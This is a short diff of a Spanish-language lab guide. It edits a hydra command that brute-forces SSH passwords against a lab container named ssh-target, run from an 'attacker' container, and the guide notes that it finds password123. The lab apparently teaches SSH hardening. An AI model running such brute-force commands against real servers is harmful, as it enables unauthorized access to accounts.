@@ -74,7 +74,7 @@ Primero, ataca el servidor SSH **sin** protección:
 
 ```bash
 # Desde el contenedor attacker
-hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 4
+hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 1 -f
 
 # Resultado: Encuentra password123 sin problemas
 ```
